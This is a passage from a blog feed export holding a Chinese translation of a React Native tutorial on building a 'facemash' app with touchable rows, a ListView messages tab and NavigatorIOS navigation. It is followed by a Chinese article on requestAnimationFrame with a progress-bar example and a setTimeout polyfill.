&lt;/Text&gt; &lt;Text style={ styles.personScoreValue }&gt; { person.score } &lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; &lt;/View&gt; ) } }); // omitted code var styles = StyleSheet.create({ ..., person: { flex: 1, margin: 10, borderRadius: 3, overflow: &apos;hidden&apos; }, personInfo: { borderLeftColor: &apos;rgba( 0, 0, 0, 0.1 )&apos;, borderLeftWidth: 1, borderRightColor: &apos;rgba( 0, 0, 0, 0.1 )&apos;, borderRightWidth: 1, borderBottomColor: &apos;rgba( 0, 0, 0, 0.1 )&apos;, borderBottomWidth: 1, padding: 10, alignItems: &apos;center&apos;, flexDirection: &apos;row&apos; }, personImage: { flex: 1, height: 200 }, personName: { fontSize: 18, flex: 1, paddingLeft: 5 }, personScore: { flex: 0.25, alignItems: &apos;center&apos; }, personScoreHeader: { color: &apos;rgba( 0, 0, 0, 0.3 )&apos;, fontSize: 10, fontWeight: &apos;bold&apos; }, personScoreValue: { color: &apos;rgba( 0, 0, 0, 0.6 )&apos;, fontSize: 16 }, won: { color: &apos;#93C26D&apos; }, lost: { color: &apos;#DD4B39&apos; } }); module.exports = facemashTab; 你可以从分支二检出到目前这儿为止的代码。现在我们已经让用户显示了出来，可以着手加入点击时间来让用户选择出谁比较热门了。 手指触击 React Native 为我们提供了 TouchableHighlight 组件. 它能让我们的View组件正常的响应触摸. 当它被触摸时，被封装视图的透明度降低了. 这就让我们的组件“感官上”是可以触摸的了.我们准备用这个东西封装个人信息部分. 将来我们可能想要创建它来让用户可以在上面点击，从而看到更多有关那个人的图片. // omitted code var Person = React.createClass({ render: function() { var person = this.props.person; return ( &lt;View style={ styles.person }&gt; &lt;Image style={ styles.personImage } source={ { uri: person.picture } } /&gt; &lt;TouchableHighlight&gt; &lt;View style={ styles.personInfo }&gt; &lt;Text style={ styles.personName }&gt; { person.firstName } { person.lastName } &lt;/Text&gt; &lt;View style={ styles.personScore }&gt; &lt;Text style={ styles.personScoreHeader }&gt; WON &lt;/Text&gt; &lt;Text style={ [styles.personScoreValue, styles.won] }&gt; { person.won } &lt;/Text&gt; &lt;/View&gt; &lt;View style={ styles.personScore }&gt; &lt;Text style={ styles.personScoreHeader }&gt; LOST &lt;/Text&gt; &lt;Text style={ [styles.personScoreValue, styles.lost] }&gt; { person.lost } &lt;/Text&gt; &lt;/View&gt; &lt;View style={ styles.personScore }&gt; &lt;Text style={ styles.personScoreHeader }&gt; SCORE &lt;/Text&gt; &lt;Text style={ styles.personScoreValue }&gt; { person.score } &lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; &lt;/TouchableHighlight&gt; &lt;/View&gt; ) } }); // omitted code 当你重新载入我们所做的修改并且在用户信息上点击，会发现它起作用了 - 但看起来有点糟糕. 这是因为我们还没有在视图上设置一个背景颜色，其意义是让整个组件变暗. // omitted code var styles = StyleSheet.create({ ..., person: { flex: 1, margin: 10, borderRadius: 3, overflow: &apos;hidden&apos; }, personInfo: { backgroundColor: &apos;#fff&apos;, borderLeftColor: &apos;rgba( 0, 0, 0, 0.1 )&apos;, borderLeftWidth: 1, borderRightColor: &apos;rgba( 0, 0, 0, 0.1 )&apos;, borderRightWidth: 1, borderBottomColor: &apos;rgba( 0, 0, 0, 0.1 )&apos;, borderBottomWidth: 1, padding: 10, alignItems: &apos;center&apos;, flexDirection: &apos;row&apos; }, ... }); // omitted code 现在当你在信息盒子上点击时，它就能正确工作了!TouchableHighlight 为我们提供了 TouchableWithoutFeedback 也有的一个相同的事件。TouchableWithoutFeedback 不应该被使用，因为所有被触摸的东西都应该提供某些类型的视觉上可见的反馈。这样我们就可以利用 onPress - 它会在用户已经释放了触摸，但是还没有被打断 (比如还在让他们的手指在可触摸的区域移动)时被调用。我们需要向下将一个属性传递到我们的 Person 组件，当其被触摸到时。 &apos;use strict&apos;; var React = require(&apos;react-native&apos;); var { StyleSheet, Text, View, Image, ActivityIndicatorIOS, TouchableHighlight } = React; var Person = React.createClass({ render: function() { var person = this.props.person; return ( &lt;View style={ styles.person }&gt; &lt;Image style={ styles.personImage } source={ { uri: person.picture } } /&gt; &lt;TouchableHighlight onPress={ this.props.onPress }&gt; ... &lt;/TouchableHighlight&gt; &lt;/View&gt; ) } }); var facemashTab = React.createClass({ ..., onPersonPress: function() { this.setState({ currentIndex: this.state.currentIndex + 1 }); }, ..., render: function() { var contents; if (!this.state.list.length) { contents = ( &lt;View style={ styles.loading }&gt; &lt;Text style={ styles.loadingText }&gt;Loading&lt;/Text&gt; &lt;ActivityIndicatorIOS /&gt; &lt;/View&gt; ) } else { var { list, currentIndex } = this.state; var record = list[currentIndex]; var people = record.users.map(person =&gt; &lt;Person person={ person } onPress={ this.onPersonPress } /&gt;); contents = ( &lt;View style={ styles.content }&gt; { people } &lt;/View&gt; ) } return ( &lt;View style={ styles.container }&gt; &lt;View style={ styles.header }&gt; &lt;Text style={ styles.headerText }&gt;FaceMash&lt;/Text&gt; &lt;/View&gt; { contents } &lt;/View&gt; ); } }); // omitted code 如你所见，在你的主TAB组件里面现在有了一个 onPersonPress 属性. 然后我们就可以将这个传到 Person 组件那儿, 而它们会在 TouchableHighlight 区域被触摸时调用到它. 而后我们可以增加索引，视图就会用新的人物集合来进行重新渲染.这是对 facemash 的 tab 所做的最后修改. 如果你希望走得更远，下面是一些好主意1.当选取了一个人物时可以去请求一个 REST 的端点2.检查是否已经到达了列表的尽头，显示一条消息3.让用户可以在照片上面点击来看更多的照片你可以在分支三上面检出 facemash 的 tab 的最终代码。 消息 我们现在将注意力转移到消息tab上了。这一功能有点像 iMessage - 它是有关用户的一个可滚动列表，在其中一项上面点击将会导航至一个针对那个用户的聊天视图。幸运的是， React Native 给了我们 ListView 组件，它能让我们拥有一个简单的，（使用了ScrollView的）可滚动列表，而且能高效的显示出列表(只对发生变化的行进行重新渲染，并限制了每次事件循环渲染的行只有一个)。为了使用一个 ListView, 我们需要有一个数据源. 数据元让我们可以拥有一个定制的函数来检查一行是不是发生了变化 (可以想到它类似于 toshouldComponentUpdate) ，我们可以把JSON数据放到它里面去. 数据源存在于我们的状态对象之中。在 thetabs/folder 下创建一个名为 Messages.js 的新文件 &apos;use strict&apos;; var React = require(&apos;react-native&apos;); var { StyleSheet, Text, View, Image } = React; var messagesTab = React.createClass({ render: function() { return ( &lt;View style={ styles.container }&gt; &lt;Text&gt;Messages!&lt;/Text&gt; &lt;/View&gt; ); } }); var styles = StyleSheet.create({ container: { flex: 1, backgroundColor: &apos;#fff&apos; } }); module.exports = messagesTab; 你同时需要编辑 editindex.ios.jsto 来指向新创建的组件 - // omitted code var MessagesTab = require(&apos;./tabs/Messages&apos;); var facemash = React.createClass({ getInitialState() { return { selectedTab: &apos;faceMash&apos; } }, changeTab(tabName) { StatusBarIOS.setStyle(tabName === &apos;faceMash&apos; ? 1 : 0); this.setState({ selectedTab: tabName }); }, render: function() { return ( &lt;TabBarIOS&gt; ... &lt;TabBarIOS.Item title=&quot;Messages&quot; icon={ require(&apos;image!messages&apos;) } onPress={ () =&gt; this.changeTab(&apos;messages&apos;) } selected={ this.state.selectedTab === &apos;messages&apos; }&gt; &lt;MessagesTab /&gt; &lt;/TabBarIOS.Item&gt; ... &lt;/TabBarIOS&gt; ); } }); // omitted code 根据我上面所说的，我们列表视图需要的一个数据源。这个可以通过 viaListView.DataSource 访问。我们将会在 ourgetInitialState 赋初值。 &apos;use strict&apos;; var React = require(&apos;react-native&apos;); var { StyleSheet, Text, View, Image, ListView } = React; var messagesTab = React.createClass({ getInitialState: function() { return { dataSource: new ListView.DataSource({ rowHasChanged: (r1, r2) =&gt; r1 !== r2 }) }; }, render: function(){ return ( &lt;View style={ styles.container }&gt; &lt;Text&gt;Messages!&lt;/Text&gt; &lt;/View&gt; ); } }); var styles = StyleSheet.create({ container: { flex: 1, backgroundColor: &apos;#fff&apos; } }); module.exports = messagesTab; 现在我们已经获取到数据源，需要从服务器获取一些数据，知道我们跟谁在通信。我已经包含在一个端点配置中，在 thestep-threebranch 显得更短。 // omitted code var messagesTab = React.createClass({ componentWillMount: function() { fetch(&apos;http://localhost:8882/rest/messages&apos;) .then(res =&gt; res.json()) .then(res =&gt; this.updateDataSource(res)); }, getInitialState: function() { return { dataSource: new ListView.DataSource({ rowHasChanged: (r1, r2) =&gt; r1 !== r2 }) }; }, updateDataSource: function(data){ this.setState({ dataSource: this.state.dataSource.cloneWithRows(data) }) }, render: function(){ return ( &lt;View style={ styles.container }&gt; &lt;Text&gt;Messages!&lt;/Text&gt; &lt;/View&gt; ); } }); // omitted code 这个会获取到我们的数据，然后更新我们的数据源。这些处理完之后，无论什么时候我们的数据源更新了，我们的视图也会更新的。 现在我们来看看 ListViewcomponent。简单的说， 组件需要两个属性 -dataSource(我们已经有了) 。 andrenderRow.renderRow 是一个需要返回一个 React 元素的函数。在数据源中每一行都会调用一次，然后作为参数为每一行传递合适的数据。 // omitted code var messagesTab = React.createClass({ ..., renderRow: function (){ return ( &lt;View&gt; &lt;Text&gt;Row goes here!&lt;/Text&gt; &lt;/View&gt; ); }, render: function(){ return ( &lt;View style={ styles.container }&gt; &lt;ListView dataSource={ this.state.dataSource } renderRow={ this.renderRow } /&gt; &lt;/View&gt; ); } }); // omitted code 这个会获取到我们的数据，然后更新我们的数据源。这些处理完之后，无论什么时候我们的数据源更新了，我们的视图也会更新的。 现在我们来看看 ListViewcomponent。简单的说， 组件需要两个属性 -dataSource(我们已经有了) 。andrenderRow.renderRow 是一个需要返回一个 React 元素的函数。在数据源中每一行都会调用一次，然后作为参数为每一行传递合适的数据。 // omitted code var messagesTab = React.createClass({ ..., renderRow: function (){ return ( &lt;View&gt; &lt;Text&gt;Row goes here!&lt;/Text&gt; &lt;/View&gt; ); }, render: function(){ return ( &lt;View style={ styles.container }&gt; &lt;ListView dataSource={ this.state.dataSource } renderRow={ this.renderRow } /&gt; &lt;/View&gt; ); } }); // omitted code 我们现在每一行都可以显示正确的数据。每个项的对象都作为第一个参数传递给 ourrenderRowfunction。 // omitted code var messagesTab = React.createClass({ ..., renderRow: function (person){ return ( &lt;View&gt; &lt;Text&gt;{ person.user.firstName } { person.user.lastName }&lt;/Text&gt; &lt;/View&gt; ); }, render: function(){ return ( &lt;View style={ styles.container }&gt; &lt;ListView dataSource={ this.state.dataSource } renderRow={ this.renderRow } /&gt; &lt;/View&gt; ); } }); // omitted code 我们继续我们的步骤，在这里添加其他的信息，比如图片和最新接收到的信息。 在 thetabs/folder 下创建一个名为 Messages.js 的新文件 &apos;use strict&apos;; var React = require(&apos;react-native&apos;); var { StyleSheet, Text, View, Image } = React; var messagesTab = React.createClass({ render: function() { return ( &lt;View style={ styles.container }&gt; &lt;Text&gt;Messages!&lt;/Text&gt; &lt;/View&gt; ); } }); var styles = StyleSheet.create({ container: { flex: 1, backgroundColor: &apos;#fff&apos; } }); module.exports = messagesTab; 你同时需要编辑 editindex.ios.jsto 来指向新创建的组件 - // omitted code var MessagesTab = require(&apos;./tabs/Messages&apos;); var facemash = React.createClass({ getInitialState() { return { selectedTab: &apos;faceMash&apos; } }, changeTab(tabName) { StatusBarIOS.setStyle(tabName === &apos;faceMash&apos; ? 1 : 0); this.setState({ selectedTab: tabName }); }, render: function() { return ( &lt;TabBarIOS&gt; ... &lt;TabBarIOS.Item title=&quot;Messages&quot; icon={ require(&apos;image!messages&apos;) } onPress={ () =&gt; this.changeTab(&apos;messages&apos;) } selected={ this.state.selectedTab === &apos;messages&apos; }&gt; &lt;MessagesTab /&gt; &lt;/TabBarIOS.Item&gt; ... &lt;/TabBarIOS&gt; ); } }); // omitted code 根据我上面所说的，我们列表视图需要的一个数据源。这个可以通过 viaListView.DataSource 访问。我们将会在 ourgetInitialState 赋初值。 &apos;use strict&apos;; var React = require(&apos;react-native&apos;); var { StyleSheet, Text, View, Image, ListView } = React; var messagesTab = React.createClass({ getInitialState: function() { return { dataSource: new ListView.DataSource({ rowHasChanged: (r1, r2) =&gt; r1 !== r2 }) }; }, render: function(){ return ( &lt;View style={ styles.container }&gt; &lt;Text&gt;Messages!&lt;/Text&gt; &lt;/View&gt; ); } }); var styles = StyleSheet.create({ container: { flex: 1, backgroundColor: &apos;#fff&apos; } }); module.exports = messagesTab; 现在我们已经获取到数据源，需要从服务器获取一些数据，知道我们跟谁在通信。我已经包含在一个端点配置中，在 thestep-threebranch 显得更短。 // omitted code var messagesTab = React.createClass({ componentWillMount: function() { fetch(&apos;http://localhost:8882/rest/messages&apos;) .then(res =&gt; res.json()) .then(res =&gt; this.updateDataSource(res)); }, getInitialState: function() { return { dataSource: new ListView.DataSource({ rowHasChanged: (r1, r2) =&gt; r1 !== r2 }) }; }, updateDataSource: function(data){ this.setState({ dataSource: this.state.dataSource.cloneWithRows(data) }) }, render: function(){ return ( &lt;View style={ styles.container }&gt; &lt;Text&gt;Messages!&lt;/Text&gt; &lt;/View&gt; ); } }); // omitted code 这个会获取到我们的数据，然后更新我们的数据源。这些处理完之后，无论什么时候我们的数据源更新了，我们的视图也会更新的。 现在我们来看看 ListViewcomponent。简单的说， 组件需要两个属性 -dataSource(我们已经有了) 。andrenderRow.renderRow 是一个需要返回一个 React 元素的函数。在数据源中每一行都会调用一次，然后作为参数为每一行传递合适的数据。 // omitted code var messagesTab = React.createClass({ ..., renderRow: function (){ return ( &lt;View&gt; &lt;Text&gt;Row goes here!&lt;/Text&gt; &lt;/View&gt; ); }, render: function(){ return ( &lt;View style={ styles.container }&gt; &lt;ListView dataSource={ this.state.dataSource } renderRow={ this.renderRow } /&gt; &lt;/View&gt; ); } }); // omitted code 我们现在每一行都可以显示正确的数据。每个项的对象都作为第一个参数传递给 ourrenderRowfunction。 // omitted code var messagesTab = React.createClass({ ..., renderRow: function (person){ return ( &lt;View&gt; &lt;Text&gt;{ person.user.firstName } { person.user.lastName }&lt;/Text&gt; &lt;/View&gt; ); }, render: function(){ return ( &lt;View style={ styles.container }&gt; &lt;ListView dataSource={ this.state.dataSource } renderRow={ this.renderRow } /&gt; &lt;/View&gt; ); } }); // omitted code 我们继续我们的步骤，在这里添加其他的信息，比如图片和最新接收到的信息。 &apos;use strict&apos;; var React = require(&apos;react-native&apos;); var { StyleSheet, Text, View, Image, ListView, PixelRatio } = React; function prettyTime(timestamp) { var createdDate = new Date(timestamp); var distance = Math.round( ( +new Date() - timestamp ) / 60000 ); var hours = (&apos;0&apos; + createdDate.getHours()).slice(-2); var minutes = (&apos;0&apos; + createdDate.getMinutes()).slice(-2); var month = (&apos;0&apos; + (createdDate.getMonth() + 1)).slice(-2); var date = (&apos;0&apos; + createdDate.getDate()).slice(-2); var year = createdDate.getFullYear(); var string; if (distance &lt; 1440) { string = [hours, minutes].join(&apos;:&apos;); } else if (distance &lt; 2879) { string = &apos;Yesterday&apos;; } else { string = [date, month, year].join(&apos;/&apos;); } return string; } var messagesTab = React.createClass({ ..., renderRow: function (person){ var time = prettyTime(person.lastMessage.timestamp); return ( &lt;View&gt; &lt;View style={ styles.row }&gt; &lt;Image source={ { uri: person.user.picture } } style={ styles.cellImage } /&gt; &lt;View style={ styles.textContainer }&gt; &lt;Text style={ styles.name } numberOfLines={ 1 }&gt; { person.user.firstName } { person.user.lastName } &lt;/Text&gt; &lt;Text style={ styles.time } numberOfLines={ 1 }&gt; { time } &lt;/Text&gt; &lt;Text style={ styles.lastMessage } numberOfLines={ 1 }&gt; { person.lastMessage.contents } &lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; &lt;View style={ styles.cellBorder } /&gt; &lt;/View&gt; ); }, render: function(){ return ( &lt;View style={ styles.container }&gt; &lt;ListView dataSource={ this.state.dataSource } renderRow={ this.renderRow } /&gt; &lt;/View&gt; ); } }); var styles = StyleSheet.create({ container: { flex: 1, backgroundColor: &apos;#fff&apos; }, row: { flex: 1, alignItems: &apos;center&apos;, backgroundColor: &apos;white&apos;, flexDirection: &apos;row&apos;, padding: 10 }, textContainer: { flex: 1 }, cellImage: { height: 60, borderRadius: 30, marginRight: 10, width: 60 }, time: { position: &apos;absolute&apos;, top: 0, right: 0, fontSize: 12, color: &apos;#cccccc&apos; }, name: { flex: 1, fontSize: 16, fontWeight: &apos;bold&apos;, marginBottom: 2 }, lastMessage: { color: &apos;#999999&apos;, fontSize: 12 }, cellBorder: { backgroundColor: &apos;rgba(0, 0, 0, 0.1)&apos;, height: 1 / PixelRatio.get(), marginLeft: 4 } }); module.exports = messagesTab; Looking good! 你会注意到我们在样式表中使用了一个叫做 PixelRatio 的东西. 用这个我们就可以得到能够拿来在设备上显示的最细的线. 一般，我们会用 1px 作为最细的边框，但是 React Native 中没有 px 的概念。现在我们可以添加代码来处理在用户项上面的触摸了。我们将使用 NavigatorIOS 组件 - 你会在诸如 iMessage 和 Notes 这样的应用上看到这个东西. 它能让我们获得视图之间的回退功能，顶端的导航条也会如此。实际上我们准备创建一个新的 React 组件来装这个导航。这是因为组件需要对一个初始的 React 组件进行渲染。我们会将 messagesTab 组件改称做 messageList，并创建另外一个叫做 messagesTab 的组件 &apos;use strict&apos;; var React = require(&apos;react-native&apos;); var { StyleSheet, Text, View, Image, ListView, PixelRatio, NavigatorIOS } = React; // omitted code var messageList = React.createClass({ ..., render: function(){ return ( &lt;View style={ &gt; &lt;ListView dataSource={ this.state.dataSource } renderRow={ this.renderRow } /&gt; &lt;/View&gt; ); } }); var messagesTab = React.createClass({ render: function() { return ( &lt;NavigatorIOS style={ styles.container } initialRoute={ { title: &apos;Messages&apos;, component: messageList } } /&gt; ); } }); // omitted code 看看已经变得更专业了哦。就像我们在 facemash 的 Tab 中所做的，我们现在可以向行中添加触摸时高亮效果（ TouchableHighlight） 了。 &apos;use strict&apos;; var React = require(&apos;react-native&apos;); var { StyleSheet, Text, View, Image, ListView, PixelRatio, NavigatorIOS, TouchableHighlight } = React; // omitted code var messageList = React.createClass({ componentWillMount: function() { fetch(&apos;http://localhost:8882/rest/messages&apos;) .then(res =&gt; res.json()) .then(res =&gt; this.updateDataSource(res)); }, getInitialState: function() { return { dataSource: new ListView.DataSource({ rowHasChanged: (r1, r2) =&gt; r1 !== r2 }) }; }, updateDataSource: function(data){ this.setState({ dataSource: this.state.dataSource.cloneWithRows(data) }) }, renderRow: function (person){ var time = prettyTime(person.lastMessage.timestamp); return ( &lt;View&gt; &lt;TouchableHighlight&gt; &lt;View style={ styles.row }&gt; &lt;Image source={ { uri: person.user.picture } } style={ styles.cellImage } /&gt; &lt;View style={ styles.textContainer }&gt; &lt;Text style={ styles.name } numberOfLines={ 1 }&gt; { person.user.firstName } { person.user.lastName } &lt;/Text&gt; &lt;Text style={ styles.time } numberOfLines={ 1 }&gt; { time } &lt;/Text&gt; &lt;Text style={ styles.lastMessage } numberOfLines={ 1 }&gt; { person.lastMessage.contents } &lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; &lt;View style={ styles.cellBorder } /&gt; &lt;/TouchableHighlight&gt; &lt;/View&gt; ); }, render: function(){ return ( &lt;View style={ styles.container }&gt; &lt;ListView dataSource={ this.state.dataSource } renderRow={ this.renderRow } /&gt; &lt;/View&gt; ); } }); // omitted code 重新加载然后，你会收到一个错误。这是因为我们传了两个子组件到 TouchableHighlight，但它只能很好的拿一个来进行显示。不要担心啦，我们还可以把这俩子组件封装到另外一个 View 组件中来解决问题啊。 // omitted code var messageList = React.createClass({ ..., renderRow: function (person){ var time = prettyTime(person.lastMessage.timestamp); return ( &lt;View&gt; &lt;TouchableHighlight&gt; &lt;View&gt; &lt;View style={ styles.row }&gt; &lt;Image source={ { uri: person.user.picture } } style={ styles.cellImage } /&gt; &lt;View style={ styles.textContainer }&gt; &lt;Text style={ styles.name } numberOfLines={ 1 }&gt; { person.user.firstName } { person.user.lastName } &lt;/Text&gt; &lt;Text style={ styles.time } numberOfLines={ 1 }&gt; { time } &lt;/Text&gt; &lt;Text style={ styles.lastMessage } numberOfLines={ 1 }&gt; { person.lastMessage.contents } &lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; &lt;View style={ styles.cellBorder } /&gt; &lt;/View&gt; &lt;/TouchableHighlight&gt; &lt;/View&gt; ); }, ... }); // omitted code 现在，当我们在一行上面触摸时，就会收到我们预期的效果了。等等 - 我们的底部边框看起来怪怪的！这是因为我们使用的是 rgba 值。整个视图的背景颜色正在发生变化，这意味着我们的边框随后会变得更暗。不要担心，我们可以给它一个十六进制值的。 var styles = StyleSheet.create({ ..., cellBorder: { backgroundColor: &apos;#F2F2F2&apos;, height: 1 / PixelRatio.get(), marginLeft: 4 } }); 如上所述的代码你可以在分支四中看到。 按下和弹出 现在我们已经让主列表有了样式，可以来处理用户触摸时导航发生的变化了。]]NavigatorIOS 让我们可以在想要改变当前的路由时，“按下”到组件的里面去。为此，我们需要子组件以及 messagList 中能有某些方式能访问到 NavigatorIOS 实体。幸运的是，这个已经以叫做 navigator 的属性传入了。让我们向 TouchableHighlight 组件加入一个 onPress 事件吧. // omitted code var messageList = React.createClass({ ..., openChat: function (user){ }, renderRow: function (person){ var time = prettyTime(person.lastMessage.timestamp); return ( &lt;View&gt; &lt;TouchableHighlight onPress={ this.openChat.bind(this, person.user) }&gt; ... &lt;/TouchableHighlight&gt; &lt;/View&gt; ); }, ... }); // omitted code 现在我们需要一个 React 组件来传递到 navigator。请在 tabs/ 文件夹中创建一个叫做 MessageView.js 的新文件。 &apos;use strict&apos;; var React = require(&apos;react-native&apos;); var { StyleSheet, Text, View } = React; var messageView = React.createClass({ render: function(){ return ( &lt;View style={ styles.container }&gt; &lt;Text&gt;Message view!&lt;/Text&gt; &lt;/View&gt; ); } }); var styles = StyleSheet.create({ container: { flex: 1, backgroundColor: &apos;#fff&apos; }, }); module.exports = messageView; 我们可以将这个包含到 Messages.js 文件中，并将它放到 navigator 那儿去。 // omitted code var messageList = React.createClass({ ..., openChat: function (user){ this.props.navigator.push({ title: `${user.firstName} ${user.lastName}`, component: MessageView, passProps: { user } }); }, renderRow: function (person){ var time = prettyTime(person.lastMessage.timestamp); return ( &lt;View&gt; &lt;TouchableHighlight onPress={ this.openChat.bind(this, person.user) }&gt; &lt;View&gt; &lt;View style={ styles.row }&gt; &lt;Image source={ { uri: person.user.picture } } style={ styles.cellImage } /&gt; &lt;View style={ styles.textContainer }&gt; &lt;Text style={ styles.name } numberOfLines={ 1 }&gt; { person.user.firstName } { person.user.lastName } &lt;/Text&gt; &lt;Text style={ styles.time } numberOfLines={ 1 }&gt; { time } &lt;/Text&gt; &lt;Text style={ styles.lastMessage } numberOfLines={ 1 }&gt; { person.lastMessage.contents } &lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; &lt;View style={ styles.cellBorder } /&gt; &lt;/View&gt; &lt;/TouchableHighlight&gt; &lt;/View&gt; ); }, ... }); // omitted code 从这儿你可以看到我们将下一个路由压入了 navigator。在这儿我们可以设置下一个路由的标题 (用户的姓名)，渲染什么组件 (我们新创建的 MessageView) 以及传入什么属性。这让我们可以访问我们在 MessageView 组件中需要的任何东西 (我们准备传入用户对象)。这对于我们聊天列表中的每一个都会起作用，不管其数量多还是少。不过，文本会被我们新的标题条切段。解决这个问题，主要在第一个 View 组件上放一个内边距（padding）就可以了。我们现在已经有一个用户属性被传进来了，同样可以对其进行展示！ MessageView.js &apos;use strict&apos;; var React = require(&apos;react-native&apos;); var { StyleSheet, Text, View } = React; var messageView = React.createClass({ render: function(){ var user = this.props.user; return ( &lt;View style={ styles.container }&gt; &lt;Text&gt;Chat with { user.firstName } { user.lastName }&lt;/Text&gt; &lt;/View&gt; ); } }); var styles = StyleSheet.create({ container: { flex: 1, backgroundColor: &apos;#fff&apos;, paddingTop: 64 }, }); module.exports = messageView; 你可以在 step-five 分支检测出上面的代码。 总结 请自由地在设置 tab 中加入一些功能。尝试使用其他的组件，比如 DatePickerIOS 遗迹 TextInput，来做一些通用的设置 (DOB，name，等等)。希望这里的讨论能触及一些同你在你的 React Native 应用程序中通常会用到有所不同的组件。如有任何疑问，可以在推特 @rynclark 上联系我.转自：http://www.oschina.net/translate/going-native-with-react]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[requestAnimationFrame，Web中写动画的另一种选择]]></title>
      <url>%2F2016%2F04%2F21%2F23%2F</url>
      <content type="text"><![CDATA[HTML5/CSS3时代，我们要在web里做动画选择其实已经很多了:你可以用CSS3的animattion+keyframes; 你也可以用css3的transition; 你还可以用通过在canvas上作图来实现动画，也可以借助jQuery动画相关的API方便地实现; 当然最原始的你还可以使用window.setTimout()或者window.setInterval()通过不断更新元素的状态位置等来实现动画，前提是画面的更新频率要达到每秒60次才能让肉眼看到流畅的动画效果。 现在又多了一种实现动画的方案，那就是还在草案当中的window.requestAnimationFrame()方法。 初识requestAnimationFrame 来看MDN上对其给出的诠释： The window.requestAnimationFrame() method tells the browser that you wish to perform an animation and requests that the browser call a specified function to update an animation before the next repaint. The method takes as an argument a callback to be invoked before the repaint. window.requestAnimationFrame() 将告知浏览器你马上要开始动画效果了，后者需要在下次动画前调用相应方法来更新画面。这个方法就是传递给window.requestAnimationFrame()的回调函数。 也可这个方法原理其实也就跟setTimeout/setInterval差不多，通过递归调用同一方法来不断更新画面以达到动起来的效果，但它优于setTimeout/setInterval的地方在于它是由浏览器专门为动画提供的API，在运行时浏览器会自动优化方法的调用，并且如果页面不是激活状态下的话，动画会自动暂停，有效节省了CPU开销。 基本语法可以直接调用，也可以通过window来调用，接收一个函数作为回调，返回一个ID值，通过把这个ID值传给window.cancelAnimationFrame()可以取消该次动画。 requestAnimationFrame(callback)//callback为回调函数 一个简单的例子模拟一个进度条动画，初始div宽度为1px,在step函数中将进度加1然后再更新到div宽度上，在进度达到100之前，一直重复这一过程。 &lt;div id=&quot;test&quot; style=&quot;width:1px;height:17px;background:#0f0;&quot;&gt;0%&lt;/div&gt; &lt;input type=&quot;button&quot; value=&quot;Run&quot; id=&quot;run&quot;/&gt; window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame; var start = null; var ele = document.getElementById(&quot;test&quot;); var progress = 0; function step(timestamp) { progress += 1; ele.style.width = progress + &quot;%&quot;; ele.innerHTML=progress + &quot;%&quot;; if (progress &lt; 100) { requestAnimationFrame(step); } } requestAnimationFrame(step); document.getElementById(&quot;run&quot;).addEventListener(&quot;click&quot;, function() { ele.style.width = &quot;1px&quot;; progress = 0; requestAnimationFrame(step); }, false); 浏览器支持情况既然还是草案状态下引入的一个功能，在使用全我们就需要关心一下各浏览器对它的支持情况了。就目前来说，主流现代浏览器都对它提供了支持，请看下图： 31+ 26+ 10+ 19+ 6+ 更为具体的浏览器兼容性可以在这里看到。 Polyfill Polyfill就是垫片，按发明这个词的人的原话来说，它就是一段这样的代码，让浏览器原生地支持我们期望使用的一些API。就比如这里的requestAnimationFrame，在看到了上面的浏览器支持情况后，你就知道了比上面列出的浏览器版本老的就不支持该方法，但为了让代码能够有更好的浏览器兼容性在老机器上也能运行不报错，我们可以写一些代码让浏览器在不支持requestAnimationFrame的情况下使用window.setTimeout()，这是一种回退（fallback）到过去的方法。这样一来，就可以通俗一点的理解polyfill了，它就是备胎。下面是由Paul Irish及其他贡献者放在GitHub Gist上的代码片段，用于在浏览器不支持requestAnimationFrame情况下的回退，回退到使用setTmeout的情况。当然，如果你确定代码是工作在现代浏览器中，下面的代码是不必的。 // http://paulirish.com/2011/requestanimationframe-for-smart-animating/ // http://my.opera.com/emoller/blog/2011/12/20/requestanimationframe-for-smart-er-animating // requestAnimationFrame polyfill by Erik Möller. fixes from Paul Irish and Tino Zijdel // MIT license (function() { var lastTime = 0; var vendors = [&apos;ms&apos;, &apos;moz&apos;, &apos;webkit&apos;, &apos;o&apos;]; for (var x = 0; x &lt; vendors.length &amp;&amp; !window.requestAnimationFrame; ++x) { window.requestAnimationFrame = window[vendors[x] + &apos;RequestAnimationFrame&apos;]; window.cancelAnimationFrame = window[vendors[x] + &apos;CancelAnimationFrame&apos;] || window[vendors[x] + &apos;CancelRequestAnimationFrame&apos;]; } if (!window.requestAnimationFrame) window.requestAnimationFrame = function(callback, element) { var currTime = new Date().getTime(); var timeToCall = Math.max(0, 16 - (currTime - lastTime)); var id = window.setTimeout(function() { callback(currTime + timeToCall); }, timeToCall); lastTime = currTime + timeToCall; return id; }; if (!window.cancelAnimationFrame) window.cancelAnimationFrame = function(id) { clearTimeout(id); }; }()); 上面代码作用有二，一是把各浏览器前缀进行统一，二是在浏览器没有requestAnimationFrame方法时将其指向setTimeout方法。提到备胎代码呢，这里多说一句，在CSS代码中，我们也经常使用这种回退的技巧，即对同一条CSS规则，编写多条以不同浏览器前缀开头代码，或者编写一条备用样式。下面是一个CSS中的备胎代码的例子： div { background: rgb(0, 0, 0); /* fallback */ background: rgba(0, 0, 0, 0.5); } 代码中设置div背景为黑色带50%的透明度，但IE9-的浏览器是不支持rbga格式的颜色的，所以浏览器会回退到上一条CSS规则应用rgb颜色。 Reference: article about rAF from css tricks: http://css-tricks.com/using-requestanimationframe/ article about rAF from Paul Irish:http://www.paulirish.com/2011/requestanimationframe-for-smart-animating/ what is polyfill http://remysharp.com/2010/10/08/what-is-a-polyfill/ 转自：http://www.cnblogs.com/Wayou/p/requestAnimationFrame.html#home]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[移动前端知识总结🌟]]></title>
      <url>%2F2016%2F04%2F18%2F22%2F</url>
